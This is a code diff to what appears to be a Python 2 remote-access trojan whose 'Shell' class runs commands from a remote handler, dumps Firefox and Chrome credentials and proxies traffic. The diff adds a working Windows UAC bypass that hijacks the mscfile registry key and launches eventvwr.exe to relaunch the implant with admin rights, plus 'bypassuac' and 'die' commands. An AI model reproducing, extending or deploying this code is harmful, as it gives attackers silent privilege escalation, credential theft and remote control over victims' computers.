@@ -1,18 +1,18 @@
 #!/usr/bin/env python2
-import socket, subprocess, os, threading, json, base64, datetime, getpass, time, hashlib, random, psutil, zlib, glob, select
+import socket, subprocess, os, threading, json, base64, datetime, getpass, time, hashlib, random, psutil, zlib, glob, select, sys, Queue
 from Crypto.Cipher import AES
 from twisted.internet import reactor
 from twisted.protocols import socks
 import dumpff
 if os.name =="nt":
-    import dumpchrome
+    import dumpchrome, win32net
 
 HANDLER_IP = "127.0.0.1"
 
 def windows_only(func):
-	def tester(junk):
+	def tester(*args):
 		if os.name != "nt": return "Command not available on non-windows OS."
-		else: return func(junk)
+		else: return func(*args)
 	return tester
 
 class StoppableThread(threading.Thread):
@@ -225,9 +225,42 @@ class Shell:
 		
 	def is_admin(self):
 		if os.name == "nt":
-			return str(__import__("ctypes").windll.shell32.IsUserAnAdmin() != 0)
+			return __import__("ctypes").windll.shell32.IsUserAnAdmin() != 0
 		else:
-			return str(os.geteuid() == 0)
+			return os.geteuid() == 0
+			
+	def ASCIIfy(self, string): # Remove non-ASCII characters from a string.
+		return ''.join([i if ord(i) < 128 else '' for i in string])
+     
+	@windows_only
+	def is_user_in_group(self, group, member): # Check if user is member of a group.
+		members = win32net.NetLocalGroupGetMembers(None, group, 1)
+		if self.ASCIIfy(member.lower()) in list(map(lambda d: self.ASCIIfy(d['name'].lower()), members[0])): return True
+		return False
+     
+	@windows_only
+	def name_of_admin_group(self): # Get name of Administrators group.
+		for line in self.execute_shell_command("whoami /groups").splitlines():
+			if "S-1-5-32-544" in line:
+				return line.split()[0].split("\\")[1]
+		
+	@windows_only
+	def bypass_uac(self):
+		if self.is_admin():
+			return "You already have admin privileges!"
+         
+		if not self.is_user_in_group(self.name_of_admin_group(), getpass.getuser()):
+			return "Current user is not part of admin group."
+         
+		if not self.execute_shell_command("REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin").split()[3] == "0x5":
+			return "UAC is disabled or notification policy is set to 'Always'"
+			
+		print self.execute_shell_command("REG DELETE HKCU\Software\Classes\mscfile\shell\open\command /f")
+		print self.execute_shell_command('REG ADD HKCU\Software\Classes\mscfile\shell\open\command /ve /f /d "'+os.path.abspath(sys.executable)+'"')
+		os.startfile("eventvwr.exe")
+		time.sleep(5)
+		print self.execute_shell_command("REG DELETE HKCU\Software\Classes\mscfile\shell\open\command /f")
+		return "A new session with admin privileges should appear in the next 30 seconds."
 					
 	def handle_command(self, data):
 		command = data.split()[0]
@@ -261,7 +294,11 @@ class Shell:
 		elif command == "dumpchrome":
 			output = self.dumpchrome()
 		elif command == "isadmin":
-			return self.is_admin()
+			return str(self.is_admin())
+		elif command == "bypassuac":
+			return self.bypass_uac()
+		elif command == "die":
+			os._exit(0)
 		else:
 			output = self.execute_shell_command(command+" "+arguments)
 			
